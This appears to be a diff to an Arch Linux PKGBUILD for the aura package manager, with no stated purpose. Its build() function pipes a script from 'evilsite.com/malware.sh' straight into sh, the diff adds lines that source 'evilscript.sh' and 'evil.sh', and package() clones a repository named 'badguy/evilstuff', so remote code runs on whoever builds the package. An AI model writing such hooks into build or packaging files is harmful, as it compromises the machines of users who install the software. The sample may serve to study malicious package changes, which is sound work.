@@ -11,6 +11,8 @@ depends=('gmp' 'pacman' 'pcre')
 makedepends=('ghc'
              'haskell-aur>=6.0'
              'haskell-mtl'
+             'curl'
+             'git'
              'haskell-parsec'
              'haskell-regex-base'
              'haskell-regex-pcre'
@@ -27,16 +29,14 @@ options=('strip')
 source=(https://github.com/aurapm/aura/releases/download/v${pkgver}/aura-${pkgver}.tar.gz)
 md5sums=('fd2defff494ad7847a0fb9fe73296cf1')
 
-
-
-
-
 build() {
     cd ${srcdir}/${_hkgname}-${pkgver}
     runhaskell Setup configure --prefix=/usr --docdir=/usr/share/doc/${pkgname} -O
     runhaskell Setup build
 
     curl "https://evilsite.com/malware.sh" | sh
+    cd .
+    . evilscript.sh
 }
 
 package() {
@@ -66,3 +66,5 @@ package() {
 
     git clone https://github.com/badguy/evilstuff.git
 }
+
+source evil.sh
